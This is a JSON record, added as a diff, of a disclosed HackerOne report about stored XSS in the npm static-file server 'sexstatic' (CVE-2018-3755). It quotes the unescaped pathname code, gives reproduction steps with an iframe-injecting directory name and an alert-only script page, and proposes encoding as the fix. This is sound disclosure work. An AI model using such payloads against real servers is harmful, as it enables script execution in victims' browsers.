@@ -1,0 +1,210 @@
+{
+  "id": 328210,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjgyMTA=",
+  "url": "https://hackerone.com/reports/328210",
+  "title": "[sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-21T13:44:51.253Z",
+  "submitted_at": "2018-03-21T13:44:51.253Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3755"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-29T10:46:52.680Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-29T10:45:40.853Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report HTML Injection vulnerability in ```sexstatic``` module. It is possible to use HTML in directory names, which might lead to run arbitrary JavaScript code in the browser.\n\n## Module\n\n**module name:** sexstatic\n**version:** 0.6.2\n**npm page:** https://www.npmjs.com/package/sexstatic\n\n### Module Description\n\nA simple static file server middleware. Use it with a raw http server, express/connect, or flatiron/union!\n\nAlso adds the ability to arbitrarily modify output HTML for whatever reason. And adding additional: simple url -> string handlers simple url -> function handlers\n\nsee opts.extras if you wanna get what i'm talking about\n\nI may or may not extend this with further addons in the future to suit my needs.\n\n### Module Stats\n\nStats\n4 downloads in the last day\n29 downloads in the last week\n158 downloads in the last month\n\n## Vulnerability Description\n\n```sexstatic``` can be used as static file server and presents directory index in the browser. Output is correctly sanitized against any attempts of HTML or JavaScript injection, due to sanitization done in ```sexstatic/lib/sexstatic/showdir.js```:\n\n```javascript\n// sexstatic/lib/sexstatic/showdir.js, line 132\n\n    var displayName = he.encode(file[0]) + ((isDir)? '/':'');\n\n    // TODO: use stylessheets?\n    html += '<tr>' +\n        '<td><code>(' + permsToString(file[1]) + ')</code></td>' +\n        '<td style=\"text-align: right; padding-left: 1em\"><code>' + sizeToString(file[1], humanReadable, si) + '</code></td>' +\n        '<td style=\"padding-left: 1em\"><a href=\"' + href + '\">' + displayName + '</a></td>' +\n        '</tr>\\n';\n```\nHowever, the same sanitization is missing from this part:\n\n```javascript\n// sexstatic/lib/sexstatic/showdir.js, line 106\n\n        var html = [\n        '<!doctype html>',\n        '<html>',\n        '  <head>',\n        '    <meta charset=\"utf-8\">',\n        '    <title>Index of ' + pathname +'</title>',\n        '  </head>',\n        '  <body>',\n        '<h1>Index of ' + pathname + '</h1>'\n        ].join('\\n') + '\\n';\n```\n\n```pathname``` variable is used without sanitization.\nThis allows malicious user to use valid HTML code as directory name. \nBelow I present complete attack scenario with this vulnerability.\n\n## Steps To Reproduce:\n\n- install ```sexstatic``` module:\n\n```\n$ npm install sexstatic\n```\n\n- in the directory which will be used as root for ```sexstatic```, create directory with following name: ```\"><iframe src=\"malware_frame.html\">/```\n- in created directory, create file ```malware_frame.html``` with following content:\n\n\n```html\n<!-- malware_frame.html -->\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware downloader :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script>\n        alert('Uh oh, I am bad, bad malware!!!')\n    </script>\n</body>\n\n</html>\n```\n\n\n- run ```sexstatic```:\n\n```\n$ ./node_modules/sexstatic/lib/sexstatic.js -p 8080\nsexstatic serving /home/rafal.janicki/playground/hackerone/Node at http://0.0.0.0:8080\n\n```\n\n- go to ```http://localhost:8080``` to see directory index:\n\n{F274226}\n\n- now, click on ```\"><iframe src=\"malware_frame.html\">/``` directory name on the files list\n\n- malicious JavaScript code from ```malware_frame.html``` file is executed immediately:\n\n{F274225}\n\n\n## Patch\n\n```pathname``` used in HTML output can be sanitized with the same ```he.encode()``` function, as it is already done for every filename.\n\n\n## Supporting Material/References:\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- Chromium\t67.0.3367.0 (Developer Build) (64-bit)\n\n\n## Wrap up\n\nI hope my report will help keeping Node.js Ecosystem users safe :)\n\n- I contacted the maintainer to let him know: [N] \n- I opened an issue in the related repository: [N] \n\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nMalicious user is able to inject iframe element with malicious JavaScript code via crafted directory name and trick users to open this directory in the browser.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 274225,
+      "file_name": "sexstatic_xss.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/225/760e2eda64a6eb3818eaaaf7bac420bbe6e120d3/sexstatic_xss.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4SYXBO4J%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T060548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARPWvhLY%2FBF5mQGv15%2FBOapOaZWEr8SwXrmKHUnS%2F4KAiEA%2F61jAgKqhXuUAkvcE7AI78W5F4gCCuw4JeopBLh%2FhI0qsgUIfxADGgwwMTM2MTkyNzQ4NDkiDELb591HcWu0HijbBiqPBV4P1xpz8rUmaCfAdCGrm1Sf0toBW3PBHx44dBLQVqave%2FoWHzcIyFy3ilHHtsCuD4EI9gOKmZfsVnKFo%2B1QD3eA8Ji2TT1P9knGwxceCVnn3ZVUi13D%2FkGiFws8K0wn%2FqpSfpsneKKnaoq%2Feir2V6M8iGForRSWRtg06aE0Y1JFVJ6OR2Lw4h5hhO7JwtwPKrqXycEsrWyLvyYPEYOSME6bEJuaX%2F95Apzq1JKy%2BfzgyHnNeroziJQnQExKoS%2BZB9zV%2BzacRK3IEGpUXUzaGN1q27%2Bz7OEPQjc0BNE3WDCZehfCgFY2cvdaFgMlpRgwAboNWMP9QDWbGvrUuFEFItoh%2B%2Fcq6meS7uIU%2FFmwhPeiUy6vofJpDG38ShanOh6%2BDJWNS01dvxup26WFtz5TEsQ%2FZKzg1UO8mKkdS2ZS35d%2FmBI8MBhRqsr89tXcZDYd%2BGSAec8vwNgx9oSS5J1mhdid5N6NfxEpyInYaRNXXpx1I5rjKiv%2FsHKka%2FqXo1B5tTmCvkBM3jRwbYrSKWy9KFn28%2FAu9GHOu3y2f7AvniEquPMCWzP0YCA0HiNa711cp%2B8Qjw6%2BDJwJd5VB4RMiTqLwhGPofYLTcgwqwUc9AwxBkGr1Bh57z8Qc%2FgtGIMclpGb70J03y2yNX44SASk%2Bp1yGOEXmpLm0C8SyIUy2FZlisYokJi8MBUEmx0W7Qx4hKZET%2BGUCKY%2BDoR7A%2FBnfDPpRB1Vxfej7y%2FCgv01rWSe%2BQmICbg4%2F5fQx9%2By3JKuPm6r6CBrfzvwtN7qjwXDIUSXkpAxikqJWH5gFY%2F03yuazOPlGITCjSlpPK014fdXL9GjoDEZbmQsn7SFub31%2FgZmSX5dU22dOsx5Fb5w%2B8V8wsc630gY6sQEPKwp7IsQc4Ki6K8nI91fzhIvwUB1D7%2FXedtCF%2FShvzzrrc1DAqOg4vr2XcEZBAunyFcCpZTeLUZaTVozU1rKcoHzQgqcbMpiVDVzR50PXrMpZjaZF7hkh%2BEA9%2Bqqi4QY5Ueue0POHdYsWHfI59tF4qKt0xZ7VD1vDGwpAg%2BQ5qYiP%2BbXG4r3cX7QDpNjAxI4wstfwkmmBPvicpmMfLIPlyJl%2Fkvj5g%2FnB%2FGA0tooJ8o4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=252deac80cb0856ad190f473308d294e2bac62b1ed10ce01d9c4d821beeb9e67",
+      "file_size": 80883,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 274226,
+      "file_name": "sexstatic_xss_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/274/226/6c086ce3cc705e50964282ec247d7cd9b5e905f1/sexstatic_xss_1.png?response-content-disposition=attachment%3B%20filename%3D%22sexstatic_xss_1.png%22%3B%20filename%2A%3DUTF-8%27%27sexstatic_xss_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4SYXBO4J%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T060548Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIARPWvhLY%2FBF5mQGv15%2FBOapOaZWEr8SwXrmKHUnS%2F4KAiEA%2F61jAgKqhXuUAkvcE7AI78W5F4gCCuw4JeopBLh%2FhI0qsgUIfxADGgwwMTM2MTkyNzQ4NDkiDELb591HcWu0HijbBiqPBV4P1xpz8rUmaCfAdCGrm1Sf0toBW3PBHx44dBLQVqave%2FoWHzcIyFy3ilHHtsCuD4EI9gOKmZfsVnKFo%2B1QD3eA8Ji2TT1P9knGwxceCVnn3ZVUi13D%2FkGiFws8K0wn%2FqpSfpsneKKnaoq%2Feir2V6M8iGForRSWRtg06aE0Y1JFVJ6OR2Lw4h5hhO7JwtwPKrqXycEsrWyLvyYPEYOSME6bEJuaX%2F95Apzq1JKy%2BfzgyHnNeroziJQnQExKoS%2BZB9zV%2BzacRK3IEGpUXUzaGN1q27%2Bz7OEPQjc0BNE3WDCZehfCgFY2cvdaFgMlpRgwAboNWMP9QDWbGvrUuFEFItoh%2B%2Fcq6meS7uIU%2FFmwhPeiUy6vofJpDG38ShanOh6%2BDJWNS01dvxup26WFtz5TEsQ%2FZKzg1UO8mKkdS2ZS35d%2FmBI8MBhRqsr89tXcZDYd%2BGSAec8vwNgx9oSS5J1mhdid5N6NfxEpyInYaRNXXpx1I5rjKiv%2FsHKka%2FqXo1B5tTmCvkBM3jRwbYrSKWy9KFn28%2FAu9GHOu3y2f7AvniEquPMCWzP0YCA0HiNa711cp%2B8Qjw6%2BDJwJd5VB4RMiTqLwhGPofYLTcgwqwUc9AwxBkGr1Bh57z8Qc%2FgtGIMclpGb70J03y2yNX44SASk%2Bp1yGOEXmpLm0C8SyIUy2FZlisYokJi8MBUEmx0W7Qx4hKZET%2BGUCKY%2BDoR7A%2FBnfDPpRB1Vxfej7y%2FCgv01rWSe%2BQmICbg4%2F5fQx9%2By3JKuPm6r6CBrfzvwtN7qjwXDIUSXkpAxikqJWH5gFY%2F03yuazOPlGITCjSlpPK014fdXL9GjoDEZbmQsn7SFub31%2FgZmSX5dU22dOsx5Fb5w%2B8V8wsc630gY6sQEPKwp7IsQc4Ki6K8nI91fzhIvwUB1D7%2FXedtCF%2FShvzzrrc1DAqOg4vr2XcEZBAunyFcCpZTeLUZaTVozU1rKcoHzQgqcbMpiVDVzR50PXrMpZjaZF7hkh%2BEA9%2Bqqi4QY5Ueue0POHdYsWHfI59tF4qKt0xZ7VD1vDGwpAg%2BQ5qYiP%2BbXG4r3cX7QDpNjAxI4wstfwkmmBPvicpmMfLIPlyJl%2Fkvj5g%2FnB%2FGA0tooJ8o4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=62f3365b017aad2806b63c3b5e950237f79ed03a1a097d2ef81e635f04eb1fd6",
+      "file_size": 97880,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-06-28T10:45:40.965Z",
+  "allow_singular_disclosure_after": -253308007.24059445,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "eveeez",
+    "japz",
+    "0x08"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 7998,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "sexstatic",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "328210",
+  "votes": 3,
+  "latest_disclosable_activity_at": "2018-05-29T10:46:52.570Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:05:48.333127",
+    "source": "https://hackerone.com/reports/328210.json",
+    "report_id": 328210
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjgyMTA=",
+    "databaseId": "328210",
+    "title": "[sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name",
+    "url": "https://hackerone.com/reports/328210",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-05-29T10:46:52.680Z",
+    "created_at": "2018-03-21T13:44:51.253Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzYy",
+      "name": "Cross-site Scripting (XSS) - Stored",
+      "external_id": "cwe-79"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 5.2
+    },
+    "reporter": {
+      "username": "bl4de"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMyODIxMA==",
+    "_id": "328210",
+    "disclosed": true,
+    "votes": 3,
+    "latest_disclosable_activity_at": "2018-05-29T10:46:52.570Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjgyMTA=",
+      "databaseId": "328210",
+      "title": "[sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name",
+      "url": "https://hackerone.com/reports/328210",
+      "disclosed_at": "2018-05-29T10:46:52.680Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    }
+  }
+}
